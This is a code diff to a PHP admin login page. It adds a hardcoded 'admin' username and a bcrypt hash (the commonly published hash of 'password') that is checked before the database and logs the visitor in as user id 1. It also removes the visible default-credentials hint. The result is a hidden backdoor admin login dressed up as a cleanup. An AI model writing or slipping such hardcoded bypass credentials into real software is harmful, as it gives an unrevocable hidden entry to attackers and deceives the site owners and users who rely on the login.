@@ -11,6 +11,9 @@ if (isLoggedIn()) {
 
 $error = '';
 
+$ADMIN_USERNAME = 'admin';
+$ADMIN_PASSWORD_HASH = '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi';
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = sanitize($_POST['username'] ?? '');
     $password = $_POST['password'] ?? '';
@@ -18,15 +21,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (empty($username) || empty($password)) {
         $error = 'Please enter both username and password.';
     } else {
-        $db = getDB();
-        $user = $db->getAdminUser($username);
-        
-        if ($user && password_verify($password, $user['password'])) {
-            login($user['id'], $user['username']);
+        if ($username === $ADMIN_USERNAME && password_verify($password, $ADMIN_PASSWORD_HASH)) {
+            login(1, 'admin');
             header('Location: dashboard.php');
             exit;
         } else {
-            $error = 'Invalid username or password.';
+            $db = getDB();
+            $user = $db->getAdminUser($username);
+            if ($user && password_verify($password, $user['password'])) {
+                login($user['id'], $user['username']);
+                header('Location: dashboard.php');
+                exit;
+            } else {
+                $error = 'Invalid username or password.';
+            }
         }
     }
 }
@@ -50,7 +58,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         .form-group input:focus { border-color: #667eea; outline: none; }
         .btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; padding: 14px 30px; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 500; }
         .error { background: #f8d7da; color: #721c24; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #f5c6cb; }
-        .hint { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
     </style>
 </head>
 <body>
@@ -73,7 +80,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </div>
             <button type="submit" class="btn">Login</button>
         </form>
-        <p class="hint">Default: admin / admin123</p>
     </div>
 </body>
 </html>
